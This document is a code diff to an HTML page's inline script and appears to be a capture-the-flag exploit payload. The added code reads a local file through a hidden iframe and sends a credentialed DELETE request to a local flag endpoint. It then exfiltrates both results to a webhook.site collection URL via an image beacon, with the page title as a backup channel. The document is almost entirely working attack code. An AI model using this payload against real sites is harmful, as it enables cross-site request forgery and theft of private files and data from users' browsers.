@@ -7,32 +7,65 @@
 <body>
   <script>
     (async () => {
-      const beacon = (msg) => {
-        // signal out regardless of result
-        (new Image()).src =
-          'https://webhook.site/2c8771d5-e4a6-46a9-920e-779f60801182/collect?f=' +
-          encodeURIComponent(msg);
+      const hook = 'https://webhook.site/2c8771d5-e4a6-46a9-920e-779f60801182/collect';
+
+      const beacon = (obj) => {
+        const qs = new URLSearchParams(obj).toString();
+        (new Image()).src = `${hook}?${qs}`;
       };
 
+      // 1) Load /app/nirvana.txt inside a hidden iframe (same-origin required to read)
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = '/app/nirvana.txt';
+      document.body.appendChild(iframe);
+
+      let nirvana = '';
+      const readIframe = () => {
+        try {
+          const doc = iframe.contentDocument || iframe.contentWindow.document;
+          // try common containers for text/plain rendering
+          nirvana =
+            (doc.body && doc.body.innerText) ||
+            (doc.documentElement && doc.documentElement.innerText) ||
+            '';
+        } catch (e) {
+          nirvana = 'iframe_read_blocked';
+        }
+      };
+
+      // wait for load or give it a short timeout fallback
+      await new Promise((res) => {
+        let done = false;
+        const finish = () => { if (!done) { done = true; res(); } };
+        iframe.addEventListener('load', () => { readIframe(); finish(); });
+        setTimeout(() => { readIframe(); finish(); }, 1200);
+      });
+
+      // 2) Hit the flag endpoint
+      let flag = '';
       try {
         const r = await fetch('http://127.0.0.1:3000/reach_nirvana', {
           method: 'DELETE',
           credentials: 'include',
         });
-
-        // Try to read the body; if CORS blocks, still signal success
-        let flag = '';
         try {
           flag = await r.text();
-        } catch (_) {
-          flag = 'sent_but_cors_blocked_read';
+          if (!flag) flag = 'empty_response';
+        } catch {
+          flag = 'flag_cors_blocked_read';
         }
-
-        beacon(flag || 'empty_response');
-        if (flag) document.title = flag;
-      } catch (e) {
-        beacon('err');
+      } catch {
+        flag = 'flag_req_failed';
       }
+
+      // 3) Exfil both in one message; also mirror into <title> as a backup side-channel
+      beacon({
+        f: flag,
+        note: nirvana ? nirvana.slice(0, 4000) : 'no_nirvana',
+      });
+
+      document.title = `${flag} | ${nirvana ? nirvana.slice(0, 64) : 'no_nirvana'}`;
     })();
   </script>
 </body>
